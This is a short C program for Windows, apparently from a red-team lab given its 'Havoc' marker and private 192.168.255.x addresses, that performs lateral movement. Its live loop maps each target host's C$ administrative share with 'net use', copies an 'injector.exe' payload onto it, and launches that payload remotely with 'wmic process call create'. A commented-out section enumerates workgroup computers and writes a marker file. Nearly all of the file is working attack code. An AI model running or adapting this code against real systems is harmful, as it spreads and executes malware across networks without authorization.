#include <stdio.h>
#include <windows.h>
#include <fileapi.h>
#include <wininet.h>
#include <stdint.h>
#include <winnt.h>
#include <unistd.h>

int main ()
{
// Enumerate computers in a workgroup.
/*
NET_API_STATUS ntstatus;
DWORD entriesread = 0;
DWORD totalentries = 0;
DWORD resume_handle = 0;
SERVER_INFO_101 *pBuf = NULL;


ntstatus = NetServerEnum(NULL, 101, (LPBYTE *)&pBuf, MAX_PREFERRED_LENGTH, &entriesread, &totalentries, SV_TYPE_ALL, NULL, &resume_handle);

if (ntstatus == NERR_Success || ntstatus == ERROR_MORE_DATA) {
for (DWORD i = 0; i < entriesread; i++)
{
	printf("finding: %d", i);
	printf(" %ws\n", *pBuf->sv101_name);
}
} else {
	 printf("Failed to enumerate network computers. Error: %ld\n", ntstatus);
    }

    if (pBuf) {
        NetApiBufferFree(pBuf);
    }
	




//Variable declare for File creation	
	const char* dirpath = "c:\\Users\\saurav\\Temp";
	const char* filename = "c:\\Users\\saurav\\Temp\\computer.txt";
    const char* filecontent = "HavocWindows14Sept-A";

//Create Directory
	BOOL bDir;
	bDir = CreateDirectoryA(dirpath, NULL);

//Create a File
	HANDLE hfile;
	hfile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("File creation failed\n");
		return 1;
	}
	
//Write to file
    BOOL WrFile;
    long unsigned int byteswritten;
    WrFile = WriteFile(hfile, filecontent, strlen(filecontent), &byteswritten, NULL);

    CloseHandle(hfile);
*/

//system("echo HavocWindows14Sept-A > c:\\Users\\saurav\\Temp\\computer.txt");
//char *hostip = "192.168.255.";
	int i;
	char host[20];
	char netuser[100];
	char copyfile[100];
	char wmicrun[100];
	
	for (i = 17; i < 22; i += 4)
	{
		snprintf(host, sizeof(host), "192.168.255.%d", i);
		printf("%s\n", host);
		snprintf(netuser, sizeof(netuser),"net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i );
		system(netuser);

		system("copy c:\\users\\saurav\\Downloads\\injector.exe f:");
		//snprintf(copyfile, sizeof(copyfile), );
		snprintf(wmicrun, sizeof(wmicrun), "wmic /node:192.168.255.%d process call create 'c:\\Users\\saurav\\Downloads\\injector.exe'", i );
		system(wmicrun);
		
	    //system("net use F: \\\\192.168.255.%d\\C$\\users\\saurav\\Downloads /user:saurav", i);
		
        //system("wmic /node:@'192.168.255.%d' process call create '\\\\192.168.255.%d\\c$\\Users\\saurav\\Downloads\\injector.exe'", i);
		snprintf(netuser, sizeof(netuser),"net use F: /delete");
		system(netuser);
	}


}
